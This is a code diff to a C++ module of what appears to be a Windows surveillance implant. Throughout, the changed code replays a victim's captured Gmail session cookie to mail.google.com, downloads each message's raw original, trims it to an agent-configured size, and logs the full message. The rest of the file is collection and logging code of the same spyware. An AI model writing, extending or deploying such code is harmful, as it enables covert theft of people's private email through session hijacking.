@@ -1,10 +1,8 @@
 #include <windows.h>
-#include <string>
 #include <stdio.h>
 #include <time.h>
 #include "..\common.h"
 #include "..\LOG.h"
-#include "..\JSON\JSON.h"
 #include "SocialMain.h"
 #include "NetworkHandler.h"
 
@@ -21,29 +19,14 @@ extern void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi);
 extern WCHAR *UTF8_2_UTF16(char *str); // in firefox.cpp
 
 extern BOOL bPM_MailCapStarted; // variabili per vedere se gli agenti interessati sono attivi
-
-void JsonDecode(char *string)
-{
-	WCHAR *string_16, *ptr;
-	DWORD size;
-	std::wstring decode_16=L"";
-
-	size = strlen(string);
-	ptr = string_16 = UTF8_2_UTF16(string);
-	if (!string_16) 
-		return;
-	JSON::ExtractString((const wchar_t **)&string_16, decode_16);
-	if (wcslen(decode_16.c_str())>0)
-		WideCharToMultiByte(CP_UTF8, 0, decode_16.c_str(), -1, string, size, 0 , 0);
-	SAFE_FREE(ptr);
-}
+extern DWORD max_social_mail_len;
 
 DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi, DWORD last_tstamp_lo, BOOL is_incoming)
 {
 	DWORD ret_val;
 	BYTE *r_buffer = NULL;
 	BYTE *r_buffer_inner = NULL;
-	DWORD response_len;
+	DWORD response_len = 0;
 	char *ptr, *ptr_inner, *ptr_inner2;
 	WCHAR mail_request[256];
 	char mail_id[17];
@@ -81,7 +64,7 @@ DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi,
 			continue;
 		SetLastFBTstamp(ik_val, act_tstamp_lo, act_tstamp_hi);
 
-		_snwprintf_s(mail_request, sizeof(mail_request)/sizeof(WCHAR), _TRUNCATE, L"/mail/?ui=2&ik=%S&view=cv&th=%S&_reqid=1&rt=c&search=%S", ik_val, mail_id, mbox);
+		_snwprintf_s(mail_request, sizeof(mail_request)/sizeof(WCHAR), _TRUNCATE, L"/mail/?ui=2&ik=%S&view=om&th=%S", ik_val, mail_id);
 		
 		ret_val = HttpSocialRequest(L"mail.google.com", L"GET", mail_request, 443, NULL, 0, &r_buffer_inner, &response_len, cookie);
 		if (ret_val != SOCIAL_REQUEST_SUCCESS) {
@@ -89,6 +72,15 @@ DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi,
 			return ret_val;
 		}
 
+		CheckProcessStatus();
+		// Check sulla dimensione stabilita' nell'agente
+		if (response_len > max_social_mail_len)
+			response_len = max_social_mail_len;
+		// Verifica che non mi abbia risposto con la pagina di login
+		if (r_buffer_inner && response_len>0 && strstr((char *)r_buffer_inner, "Received: "))
+			LogSocialMailMessageFull(MAIL_GMAIL, r_buffer_inner, response_len, is_incoming);
+
+		/*
 		// Parsa il contenuto della mail
 		_snprintf_s(tmp_buff, sizeof(tmp_buff), _TRUNCATE, "[\"ms\",\"%s\",", mail_id);
 		ptr_inner = (char *)r_buffer_inner;
@@ -159,7 +151,7 @@ DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi,
 		urldecode(cc_add);
 		JsonDecode(subject);
 		JsonDecode(ptr_inner);
-		LogSocialMailMessage(MAIL_GMAIL, src_add, dest_add, cc_add, subject, ptr_inner, is_incoming);
+		LogSocialMailMessage(MAIL_GMAIL, src_add, dest_add, cc_add, subject, ptr_inner, is_incoming);*/
 	
 		SAFE_FREE(r_buffer_inner);
 	}
